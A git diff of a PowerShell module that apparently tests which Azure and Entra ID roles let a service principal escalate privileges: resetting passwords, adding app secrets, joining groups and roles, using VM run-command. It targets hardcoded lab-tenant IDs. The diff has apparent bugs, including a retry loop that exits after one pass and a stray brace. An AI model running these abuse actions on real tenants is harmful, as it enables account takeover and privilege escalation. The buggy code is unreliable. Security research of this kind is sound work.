@@ -672,11 +672,11 @@ Function Set-AZUserPassword {
         The new password you want the target user to have
 
     .EXAMPLE
-        Set-AZUserPassword -Token $MGToken -TargetUserID "bf510275-8a83-4932-988f-1b148b83f832" -Password "SuperSafePassword12345"
+        Set-AZUserPassword -Token $MGToken -TargetUserID "f5e4c53c-7ff4-41ec-ad4a-00f512eb2dcf" -Password "SuperSafePassword12345"
 
         Description
         -----------
-        Sets the user with object ID starting with "bf5..."'s password to "SuperSafePassword12345"
+        Sets the user with object ID starting with "f5e..."'s password to "SuperSafePassword12345"
 
     .LINK
         https://docs.microsoft.com/en-us/graph/api/passwordauthenticationmethod-resetpassword?view=graph-rest-beta&tabs=http#request
@@ -1508,18 +1508,27 @@ Function Test-AzureRMVMRunCommand {
     }
     
     $Success = $False
-    Try {
-        $RunCommandRequest = Invoke-RestMethod `
-            -Uri $URI `
-            -Method POST `
-            -Headers @{Authorization = "Bearer $($TestToken)"} `
-            -ContentType "application/json" `
-            -Body $($Body | ConvertTo-Json) `
-            -ResponseHeadersVariable "Headers"
-        $Success = $True
+    $Count = 0
+    Do {
+        Try {
+            $RunCommandRequest = Invoke-RestMethod `
+                -Uri $URI `
+                -Method POST `
+                -Headers @{Authorization = "Bearer $($TestToken)"} `
+                -ContentType "application/json" `
+                -Body $($Body | ConvertTo-Json) `
+                -ResponseHeadersVariable "Headers"
+            $Success = $True
+        }
+        Catch {
+            If ($_.ErrorDetails.Message -Match "AuthorizationFailed") {
+                $Success = $False
+            }
+        }
+        $Count++
+        Start-Sleep -s 10
     }
-    Catch {
-    }
+    Until ($Success -Or $Count -eq 10 -Or $Success -eq $False)
 
     # Return an object of the test result:
     $AbuseTestResult = New-Object PSObject -Property @{
@@ -1987,7 +1996,15 @@ function Invoke-AzureRMAbuseTests {
             ValueFromPipelineByPropertyName = $True
         )]
         [String]
-        $AbuseTestType
+        $AbuseTestType,
+
+        [Parameter(
+            Mandatory = $False,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $TargetVirtualMachinePath
         
     )
 
@@ -2006,8 +2023,8 @@ function Invoke-AzureRMAbuseTests {
     $SubRoles = Get-AzureRMRoleDefinitions -Token $UserAccessAdminToken -SubscriptionID $SubscriptionID
 
     # Perform all abuse tests, creating a unique Service Principal per AzureRM role:
-    #$SubRoles | ?{$_.AzureRMRoleDisplayName -Like "Owner"} | ForEach-Object -ThrottleLimit 50 -Parallel {
-    $SubRoles | ForEach-Object -ThrottleLimit 50 -Parallel {
+    $SubRoles | ?{$_.AzureRMRoleDisplayName -Match "Virtual Machine"} | ForEach-Object -ThrottleLimit 50 -Parallel {
+    #$SubRoles | ForEach-Object -ThrottleLimit 50 -Parallel {
 
         $AzureRMRoleDisplayName = $_.AzureRMRoleDisplayName
 
@@ -2084,7 +2101,7 @@ function Invoke-AzureRMAbuseTests {
                     -TestToken              $ThreadSafeTestToken.access_token `
                     -HeldPrivilege          $AzureRMRoleDisplayName `
                     -TimeOfTest             $(Get-Date) `
-                    -VirtualMachinePath     "https://management.azure.com//subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/VMs/providers/Microsoft.Compute/virtualMachines/Win10-01"
+                    -VirtualMachinePath     ${using:TargetVirtualMachinePath} 
                 )
                 $LocalTestResult = $using:AzureRMTestResults
                 $LocalTestResult.Add($ThreadSafeTest)
@@ -2134,7 +2151,7 @@ function Invoke-AzureRMAbuseTests {
                     -TestToken              $ThreadSafeTestToken.access_token `
                     -HeldPrivilege          $AzureRMRoleDisplayName `
                     -TimeOfTest             $(Get-Date) `
-                    -VirtualMachinePath     "https://management.azure.com//subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/VMs/providers/Microsoft.Compute/virtualMachines/Win10-01"
+                    -VirtualMachinePath     ${using:TargetVirtualMachinePath} 
                 )
                 $LocalTestResult = $using:AzureRMTestResults
                 $LocalTestResult.Add($ThreadSafeTest)
@@ -3320,12 +3337,6 @@ Function Test-MGAddSelfToAADRole {
         
     )
 
-    # If either the test token or GA token expire in the next 5 minutes, bail and report this to the user.
-
-    # Ensure the provided AAD role is activated.
-
-    # Check whether the test SP is already activated for the role. If so, remove the SP from that role and get a new test token for that SP
-
     # Test whether the SP can activate itself into the provided role and return the test result object
     $body = @{
         "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
@@ -3959,7 +3970,7 @@ Function Test-MGAddMemberToNonRoleEligibleGroup {
         Test whether the supplied JWT has the privilege to add itself to a non-role eligible security group
 
     .PARAMETER TestPrincipalID
-        The ID of the service principal you are trying to activate the role for
+        The ID of the service principal you are trying to add as a member to the group
 
     .PARAMETER TargetGroupId
         The globally unique ID of the target non-role eligible security group
@@ -4060,6 +4071,7 @@ Function Test-MGAddMemberToNonRoleEligibleGroup {
         $Success = $True
     }
     Catch {
+        $_
     }
 
     # Return an object of the test result:
@@ -4433,7 +4445,7 @@ Function Invoke-AllAzureMGAbuseTests {
     $MGRoles = Get-MGAppRoles -Token $GlobalAdminToken.access_token
 
     # Perform all abuse tests, creating a unique Service Principal per MS Graph app role:
-    #$MGRoles | ?{$_.AppRoleValue -Match "RoleManagement"} | ForEach-Object -ThrottleLimit 50 -Parallel {
+    #$MGRoles | ?{$_.AppRoleValue -Match "Group"} | ForEach-Object -ThrottleLimit 50 -Parallel {
     $MGRoles | ForEach-Object -ThrottleLimit 50 -Parallel {
 
         # Import and later call our functions in a thread-safe way
@@ -4448,6 +4460,8 @@ Function Invoke-AllAzureMGAbuseTests {
         If (-Not ${global:Test-MGAddSelfAsOwnerOfApp})              { $ast = ${using:Test-MGAddSelfAsOwnerOfAppAst};            ${global:Test-MGAddSelfAsOwnerOfApp} = $ast.GetScriptBlock() }
         If (-Not ${global:Test-MGAddOwnerToRoleEligibleGroup})      { $ast = ${using:Test-MGAddOwnerToRoleEligibleGroupAst};    ${global:Test-MGAddOwnerToRoleEligibleGroup} = $ast.GetScriptBlock() }
         If (-Not ${global:Test-MGAddMemberToRoleEligibleGroup})     { $ast = ${using:Test-MGAddMemberToRoleEligibleGroupAst};   ${global:Test-MGAddMemberToRoleEligibleGroup} = $ast.GetScriptBlock() }
+        If (-Not ${global:Test-MGAddOwnerToNonRoleEligibleGroup})   { $ast = ${using:Test-MGAddOwnerToNonRoleEligibleGroupAst}; ${global:Test-MGAddOwnerToNonRoleEligibleGroup} = $ast.GetScriptBlock() }
+        If (-Not ${global:Test-MGAddMemberToNonRoleEligibleGroup})  { $ast = ${using:Test-MGAddMemberToNonRoleEligibleGroupAst};${global:Test-MGAddMemberToNonRoleEligibleGroup} = $ast.GetScriptBlock() }
         If (-Not ${global:Test-MGAddSecretToSP})                    { $ast = ${using:Test-MGAddSecretToSPAst};                  ${global:Test-MGAddSecretToSP} = $ast.GetScriptBlock() }
         If (-Not ${global:Test-MGAddSecretToApp})                   { $ast = ${using:Test-MGAddSecretToAppAst};                 ${global:Test-MGAddSecretToApp} = $ast.GetScriptBlock() }
         If (-Not ${global:Get-MSGraphTokenWithClientCredentials})   { $ast = ${using:Get-MSGraphTokenWithClientCredentialsAst}; ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }
@@ -4487,9 +4501,11 @@ Function Invoke-AllAzureMGAbuseTests {
         $MSGraphAppRoleActivation = (& ${global:New-AppRoleAssignment} `
             -SPObjectID $ThreadSafeSP.SPObjectId `
             -AppRoleID $_.AppRoleID `
-            -ResourceID "<ms graph app id>" `
+            -ResourceID "9858020a-4c00-4399-9ae4-e7897a8333fa" `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
-        )
+        ) 
+    }
+
         #Wait 5 minutes for the role activation to take effect
         Start-Sleep 300s
 
@@ -4497,12 +4513,36 @@ Function Invoke-AllAzureMGAbuseTests {
         $ThreadSafeTestToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
             -ClientID       $ThreadSafeSecret.AppRegAppId `
             -ClientSecret   $ThreadSafeSecret.AppRegSecretValue `
-            -TenantName     "contoso.onmicrosoft.com"
+            -TenantName     "specterdev.onmicrosoft.com"
         )
 
         $ThreadSafeTest = (& ${global:Test-MGAddOwnerToRoleEligibleGroup} `
             -TestPrincipalId    $ThreadSafeSP.SPObjectId `
-            -TargetGroupId      "b7891e2e-8ff6-45e6-8eab-65efe4ec06cd" `
+            -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
+            -TestToken          $ThreadSafeTestToken.access_token `
+            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+            -HeldPrivilege      $_.AppRoleValue `
+            -TestGUID           ${using:TestGUID} `
+            -TimeOfTest         $(Get-Date)
+        )
+        $LocalTestResult = $using:MGTestResults
+        $LocalTestResult.Add($ThreadSafeTest)
+
+        $ThreadSafeTest = (& ${global:Test-MGAddOwnerToNonRoleEligibleGroup} `
+            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+            -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
+            -TestToken          $ThreadSafeTestToken.access_token `
+            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+            -HeldPrivilege      $_.AppRoleValue `
+            -TestGUID           ${using:TestGUID} `
+            -TimeOfTest         $(Get-Date)
+        )
+        $LocalTestResult = $using:MGTestResults
+        $LocalTestResult.Add($ThreadSafeTest)
+
+        $ThreadSafeTest = (& ${global:Test-MGAddMemberToNonRoleEligibleGroup} `
+            -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+            -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.AppRoleValue `
@@ -4514,7 +4554,7 @@ Function Invoke-AllAzureMGAbuseTests {
 
         $ThreadSafeTest = (& ${global:Test-MGAddSecretToSP} `
             -TestPrincipalId    $ThreadSafeSP.SPObjectId `
-            -TargetSPId         "41241890-c7fb-441d-b054-bf8d071d2c36" `
+            -TargetSPId         "0e0d0975-59cb-4065-9b11-e5c960617a46" `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.AppRoleValue `
@@ -4526,7 +4566,7 @@ Function Invoke-AllAzureMGAbuseTests {
 
         $ThreadSafeTest = (& ${global:Test-MGAddSecretToApp} `
             -TestPrincipalId    $ThreadSafeSP.SPObjectId `
-            -TargetAppId        "69cdbd0d-67b8-4e19-9565-0f4e2c71d660" `
+            -TargetAppId        "57cf2904-6741-484d-a781-2ecbb13ace62" `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.AppRoleValue `
@@ -4538,7 +4578,7 @@ Function Invoke-AllAzureMGAbuseTests {
 
         $ThreadSafeTest = (& ${global:Test-MGAddMemberToRoleEligibleGroup} `
             -TestPrincipalId    $ThreadSafeSP.SPObjectId `
-            -TargetGroupId      "b7891e2e-8ff6-45e6-8eab-65efe4ec06cd" `
+            -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.AppRoleValue `
@@ -4548,10 +4588,9 @@ Function Invoke-AllAzureMGAbuseTests {
         $LocalTestResult = $using:MGTestResults
         $LocalTestResult.Add($ThreadSafeTest)
 
-
         $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfApp} `
             -TestPrincipalId    $ThreadSafeSP.SPObjectId `
-            -TargetAppId        "88cecfe3-70a5-445f-91e1-762682d95848" `
+            -TargetAppId        "57cf2904-6741-484d-a781-2ecbb13ace62" `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.AppRoleValue `
@@ -4563,7 +4602,7 @@ Function Invoke-AllAzureMGAbuseTests {
 
         $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfSP} `
             -TestPrincipalId $ThreadSafeSP.SPObjectId `
-            -TargetSPId         "a19df333-7daa-4944-9914-714fd1f9ae2b" `
+            -TargetSPId         "0e0d0975-59cb-4065-9b11-e5c960617a46" `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.AppRoleValue `
@@ -4587,7 +4626,7 @@ Function Invoke-AllAzureMGAbuseTests {
 
         $ThreadSafeTest = (& ${global:Test-MGAddSelfToAADRole} `
             -TestPrincipalId $ThreadSafeSP.SPObjectId `
-            -RoleDefinitionId   "666a4661-956f-42f7-97d1-24a794f6e019" `
+            -RoleDefinitionId   "62e90394-69f5-4237-9190-012177145e10" `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.AppRoleValue `
@@ -4621,6 +4660,9 @@ Function Invoke-AllAzureADAbuseTests {
 
     .PARAMETER TenantName
         The MS Graph-scoped JWT for the test service principal
+
+    .PARAMETER AbuseTestType
+        The type of abuse test you want to run. Default behavior: run all tests
 
     .EXAMPLE
         C:\PS> $Tests = Invoke-AllAzureADAbuseTests `
@@ -4658,7 +4700,15 @@ Function Invoke-AllAzureADAbuseTests {
             ValueFromPipelineByPropertyName = $True
         )]
         [String]
-        $TenantName
+        $TenantName,
+
+        [Parameter(
+            Mandatory = $False,
+            ValueFromPipeline = $True,
+            ValueFromPipelineByPropertyName = $True
+        )]
+        [String]
+        $AbuseTestType
         
     )
 
@@ -4689,12 +4739,17 @@ Function Invoke-AllAzureADAbuseTests {
         $body = @{
             roleTemplateId = $Role.id
         }
-        $ActivateRole = Invoke-RestMethod `
-            -Uri "https://graph.microsoft.com/v1.0/directoryRoles" `
-            -Headers @{Authorization = "Bearer $($GlobalAdminToken.access_token)"} `
-            -Method POST `
-            -ContentType 'application/json' `
-            -Body $($body | ConvertTo-Json)
+        try {
+            $ActivateRole = Invoke-RestMethod `
+                -Uri "https://graph.microsoft.com/v1.0/directoryRoles" `
+                -Headers @{Authorization = "Bearer $($GlobalAdminToken.access_token)"} `
+                -Method POST `
+                -ContentType 'application/json' `
+                -Body $($body | ConvertTo-Json)
+        }
+        Catch {
+
+        }
     }
     
     # Using my Global Admin token, get the active AzureAD roles
@@ -4722,9 +4777,11 @@ Function Invoke-AllAzureADAbuseTests {
         If (-Not ${global:Test-MGAddSelfAsOwnerOfApp})              { $ast = ${using:Test-MGAddSelfAsOwnerOfAppAst};            ${global:Test-MGAddSelfAsOwnerOfApp} = $ast.GetScriptBlock() }
         If (-Not ${global:Test-MGAddOwnerToRoleEligibleGroup})      { $ast = ${using:Test-MGAddOwnerToRoleEligibleGroupAst};    ${global:Test-MGAddOwnerToRoleEligibleGroup} = $ast.GetScriptBlock() }
         If (-Not ${global:Test-MGAddMemberToRoleEligibleGroup})     { $ast = ${using:Test-MGAddMemberToRoleEligibleGroupAst};   ${global:Test-MGAddMemberToRoleEligibleGroup} = $ast.GetScriptBlock() }
+        If (-Not ${global:Test-MGAddOwnerToNonRoleEligibleGroup})   { $ast = ${using:Test-MGAddOwnerToNonRoleEligibleGroupAst}; ${global:Test-MGAddOwnerToNonRoleEligibleGroup} = $ast.GetScriptBlock() }
+        If (-Not ${global:Test-MGAddMemberToNonRoleEligibleGroup})  { $ast = ${using:Test-MGAddMemberToNonRoleEligibleGroupAst};${global:Test-MGAddMemberToNonRoleEligibleGroup} = $ast.GetScriptBlock() }
         If (-Not ${global:Test-MGAddSecretToSP})                    { $ast = ${using:Test-MGAddSecretToSPAst};                  ${global:Test-MGAddSecretToSP} = $ast.GetScriptBlock() }
         If (-Not ${global:Test-MGAddSecretToApp})                   { $ast = ${using:Test-MGAddSecretToAppAst};                 ${global:Test-MGAddSecretToApp} = $ast.GetScriptBlock() }
-        If (-Not ${global:Get-MSGraphTokenWithClientCredentials})   { $ast = ${using:Get-MSGraphTokenWithClientCredentials};    ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }
+        If (-Not ${global:Get-MSGraphTokenWithClientCredentials})   { $ast = ${using:Get-MSGraphTokenWithClientCredentialsAst}; ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }
 
         $ThreadSafeGlobalAdminToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
             -ClientID ${using:GlobalAdminClientID} `
@@ -4774,12 +4831,279 @@ Function Invoke-AllAzureADAbuseTests {
         $ThreadSafeTestToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
             -ClientID       $ThreadSafeSecret.AppRegAppId `
             -ClientSecret   $ThreadSafeSecret.AppRegSecretValue `
-            -TenantName     "contoso.onmicrosoft.com"
+            -TenantName     "specterdev.onmicrosoft.com"
         )
+
+        Switch (${using:AbuseTestType}) {
+
+            MGAddOwnerToRoleEligibleGroup {
+                $ThreadSafeTest = (& ${global:Test-MGAddOwnerToRoleEligibleGroup} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+            }
+
+            MGAddSecretToSP {
+                $ThreadSafeTest = (& ${global:Test-MGAddSecretToSP} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetSPId         $ThreadSafeSP.SPObjectId `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+            }
+
+            MGAddSecretToApp {
+                $ThreadSafeTest = (& ${global:Test-MGAddSecretToApp} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+            }
+
+            MGAddMemberToRoleEligibleGroup {
+                $ThreadSafeTest = (& ${global:Test-MGAddMemberToRoleEligibleGroup} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+            }
+
+            MGAddSelfAsOwnerOfApp {
+                $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfApp} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+            }
+
+            MGAddOwnerToNonRoleEligibleGroup {
+                $ThreadSafeTest = (& ${global:Test-MGAddOwnerToNonRoleEligibleGroup} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+            }
+
+            MGAddMemberToNonRoleEligibleGroup {
+                $ThreadSafeTest = (& ${global:Test-MGAddMemberToNonRoleEligibleGroup} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+            }
+
+            MGAddSelfAsOwnerOfSP {
+                $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfSP} `
+                    -TestPrincipalId $ThreadSafeSP.SPObjectId `
+                    -TargetSPId         "09b51dd2-c780-4492-994a-1cbce1d66719" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+            }
+
+            MGAddSelfToMGAppRole {
+                $ThreadSafeTest = (& ${global:Test-MGAddSelfToMGAppRole} `
+                    -TestPrincipalId        $ThreadSafeSP.SPObjectId `
+                    -MGAppRoleDefinitionId  "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
+                    -TestToken              $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken     $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege          $_.displayName `
+                    -TestGUID               ${using:TestGUID} `
+                    -TimeOfTest             $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+            }
+
+            MGAddSelfToAADRole {
+                $ThreadSafeTest = (& ${global:Test-MGAddSelfToAADRole} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -RoleDefinitionId   "62e90394-69f5-4237-9190-012177145e10" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+            }
+            
+            # Run all tests by default if the user did not specify an AbuseTestType
+            default {
+                $ThreadSafeTest = (& ${global:Test-MGAddOwnerToRoleEligibleGroup} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+
+                $ThreadSafeTest = (& ${global:Test-MGAddSecretToSP} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetSPId         $ThreadSafeSP.SPObjectId `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+
+                $ThreadSafeTest = (& ${global:Test-MGAddSecretToApp} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+
+                $ThreadSafeTest = (& ${global:Test-MGAddMemberToRoleEligibleGroup} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+
+                $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfApp} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetAppId        "1aff018f-8fc0-48ac-a5bc-22dbc179150b" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+
+                $ThreadSafeTest = (& ${global:Test-MGAddOwnerToNonRoleEligibleGroup} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+
+                $ThreadSafeTest = (& ${global:Test-MGAddMemberToNonRoleEligibleGroup} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -TargetGroupId      "abafdcb5-edb4-46f0-9c81-7af56e487a37" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+
+                $ThreadSafeTest = (& ${global:Test-MGAddSelfAsOwnerOfSP} `
+                    -TestPrincipalId $ThreadSafeSP.SPObjectId `
+                    -TargetSPId         "09b51dd2-c780-4492-994a-1cbce1d66719" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+
+                $ThreadSafeTest = (& ${global:Test-MGAddSelfToMGAppRole} `
+                    -TestPrincipalId        $ThreadSafeSP.SPObjectId `
+                    -MGAppRoleDefinitionId  "9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8" `
+                    -TestToken              $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken     $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege          $_.displayName `
+                    -TestGUID               ${using:TestGUID} `
+                    -TimeOfTest             $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+
+                $ThreadSafeTest = (& ${global:Test-MGAddSelfToAADRole} `
+                    -TestPrincipalId    $ThreadSafeSP.SPObjectId `
+                    -RoleDefinitionId   "62e90394-69f5-4237-9190-012177145e10" `
+                    -TestToken          $ThreadSafeTestToken.access_token `
+                    -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
+                    -HeldPrivilege      $_.displayName `
+                    -TestGUID           ${using:TestGUID} `
+                    -TimeOfTest         $(Get-Date)
+                )
+                $LocalTestResult = $using:MGTestResults
+                $LocalTestResult.Add($ThreadSafeTest)
+
+            }
+        }
 
         $ThreadSafeTest = (& ${global:Test-MGAddOwnerToRoleEligibleGroup} `
             -TestPrincipalId    $ThreadSafeSP.SPObjectId `
-            -TargetGroupId      "354c6454-60b8-4690-9136-ce4e84a5c372" `
+            -TargetGroupId      "59595334-99d7-4e83-93b3-0054859b3d50" `
             -TestToken          $ThreadSafeTestToken.access_token `
             -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token `
             -HeldPrivilege      $_.displayName `
